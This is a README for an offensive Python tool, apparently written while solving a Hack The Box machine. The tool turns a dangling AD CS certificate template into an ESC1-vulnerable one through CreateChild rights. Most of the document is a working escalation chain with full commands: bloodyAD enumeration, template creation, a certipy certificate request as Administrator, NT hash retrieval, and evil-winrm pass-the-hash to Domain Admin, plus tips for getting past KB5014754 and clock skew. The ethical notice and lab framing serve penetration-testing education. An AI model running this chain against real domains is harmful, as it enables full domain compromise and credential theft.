# dangling-template-esc

> Weaponize a **dangling AD CS certificate template** via `CreateChild` rights — re-create the missing template object preconfigured for **ESC1** and escalate to Domain Admin.

[![Python](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

---

## ⚠️ Legal / Ethical Notice

This tool is for **authorized penetration testing, red-team engagements, and education only**. It was written while solving the Hack The Box machine **"DanglingTree."** Use it **only** on systems you own or have **explicit written permission** to test. Unauthorized use against systems you do not control is illegal. The author assumes no liability for misuse.

---

## What it does

In some AD CS environments a low-privileged user ends up with **`CreateChild`** on the `CN=Certificate Templates` container — the right to **create new** template objects — but **not** `WriteProperty`/`WriteDacl` on existing templates, and **no** rights on the CA to publish new ones. On its own that looks useless: you can create a template, but the CA won't issue it because it isn't published.

A **"dangling" certificate template** closes that gap. The CA keeps a list of template **names** it offers (its `certificateTemplates` attribute). Normally each name has a matching template **object**. A dangling reference is a name the CA **still advertises** whose **object was deleted**. Because the name is already published, if you simply **re-create the missing object** it becomes **instantly issuable — no publish step required.**

This tool re-creates that object from scratch, preconfigured to be **ESC1-vulnerable**:

- `msPKI-Certificate-Name-Flag = 1` → **ENROLLEE_SUPPLIES_SUBJECT** (you choose whose name goes on the cert)
- `msPKI-Enrollment-Flag = 0` → **no manager approval**
- Client Authentication EKU (`1.3.6.1.5.5.7.3.2`) → the cert can be used to log in
- A **hand-built security descriptor** granting **Authenticated Users** full control (enrollment)

Everything is set **at creation time**, because `CreateChild` does not allow modifying the object afterward.

---

## Why not just use `certipy template`?

`certipy template -write-default-configuration` **modifies an existing** template — it needs `WriteProperty`/`WriteDacl`. With only `CreateChild` you can't edit an object after it exists, so the configuration must be baked in during creation. That is exactly what this tool does.

---

## Requirements

```bash
pip install -r requirements.txt
```

- Python 3.8+
- [`ldap3`](https://github.com/cannatag/ldap3)
- [`impacket`](https://github.com/fortra/impacket)
- LDAPS (TCP 636) reachable on the DC

---

## Usage

```bash
python3 dangling_template_esc.py \
  -u jake.h \
  -p 'Cyberalp0' \
  -d danglingtree.htb \
  --dc-host dc.danglingtree.htb \
  -n RemoteAccessVPN
```

### Arguments

| Flag | Required | Description |
|------|----------|-------------|
| `-u, --user` | yes | sAMAccountName of the controlled principal |
| `-p, --password` | yes | Password |
| `-d, --domain` | yes | FQDN domain (e.g. `danglingtree.htb`) |
| `--dc-host` | yes | DC hostname/FQDN for LDAPS |
| `-n, --new-template` | yes | **Dangling** template name to re-create |
| `-s, --source-template` | no | Template to clone structure from (default: `User`) |
| `--base-dn` | no | Override the Certificate Templates container DN |
| `--grant-sid` | no | SID to grant enrollment (default: `S-1-5-11`, Authenticated Users) |

---

## Full attack workflow

**1. Find a dangling template.** Compare the CA's published list against the templates that actually exist:

```bash
# names the CA advertises
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u jake.h -p 'Cyberalp0' --secure \
  get object 'CN=<CA_NAME>,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  --attr certificateTemplates

# confirm your CreateChild right on the container
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u jake.h -p 'Cyberalp0' --secure get writable
```

A name on the CA's menu with **no** matching template object is your target.

**2. Re-create it as an ESC1 weapon:**

```bash
python3 dangling_template_esc.py -u jake.h -p 'Cyberalp0' \
  -d danglingtree.htb --dc-host dc.danglingtree.htb -n RemoteAccessVPN
```

**3. Request a certificate as the Administrator:**

```bash
certipy req -u 'jake.h@danglingtree.htb' -p 'Cyberalp0' \
  -dc-ip <DC_IP> -target-ip <DC_IP> \
  -ca 'danglingtree-DC-CA' -template 'RemoteAccessVPN' \
  -upn 'administrator@danglingtree.htb' \
  -sid 'S-1-5-21-...-500' -timeout 30
```

**4. Authenticate with the cert to get the NT hash** (use `faketime` if the DC clock is skewed):

```bash
faketime "$(ntpdate -q danglingtree.htb | awk '{print $1" "$2}' | tail -1)" \
  certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

**5. Pass-the-Hash → Domain Admin:**

```bash
evil-winrm -i <DC_IP> -u administrator -H <NThash>
```

---

## Notes & gotchas

- **One-shot per name.** With only `CreateChild` you can't modify or delete what you create — if an object comes out wrong, that dangling name is burned. Pick a fresh dangling name for each attempt.
- **SID in the request matters.** Patched DCs (post-KB5014754) require the target's SID inside the cert, or `certipy auth` fails. Supply `-sid ...-500` for the built-in Administrator.
- **LDAPS required.** DCs commonly reject unencrypted LDAP writes with `strongerAuthRequired`; this tool connects over LDAPS by default.
- **Kerberos = clock.** `certipy auth` uses PKINIT (no NTLM fallback), so fix clock skew with `faketime` or `ntpdate`.

---

## Background reading

- SpecterOps — *Certified Pre-Owned* (the original AD CS ESC research)
- [ly4k/Certipy](https://github.com/ly4k/Certipy)
- [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)

---

## Author

**CyberAlp0** — [CyberSkii.com](https://www.cyberskii.com)
Bilingual (AR/EN) cybersecurity awareness & technical write-ups.

## License

MIT — see [LICENSE](LICENSE).
